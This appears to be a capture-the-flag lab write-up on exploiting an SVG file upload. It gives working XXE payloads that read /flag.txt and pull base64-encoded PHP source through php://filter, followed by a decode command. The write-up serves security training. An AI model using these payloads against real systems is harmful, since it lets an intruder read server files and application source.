# Limited File Uploads

#### The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt"

The application in this section allows to upload a file, and the goal of this exercise is to try to exploit any file upload vulnerability.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

To look for the flag we must adapt the script provided along the section:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>
```

Just create a file (`nano xxe.svg`), copy and paste the code above and then hit the **Upload** button.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After the image got successfully uploaded, look for the svg file with the **inpect element** too&#x6C;**.**

And the flag should be easily visible!

#### Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)

For the second part, in the same application we have another task. This time we have to read the source code of 'upload.php' and identify the uploads directory.

This time we'll the following script:

{% code overflow="wrap" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```
{% endcode %}

Like the last time, upload the file and look for the .svg file.

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

You should see a base64 string within. Copy it and use in the command bellow do decode it:

```bash
echo "base64_string" | base64 --decode
```

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And there it is! We manage to decode it and get the uploads directory!
